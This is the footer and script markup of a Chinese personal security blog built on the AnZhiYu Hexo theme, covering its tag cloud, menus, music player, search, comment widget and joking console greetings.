href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>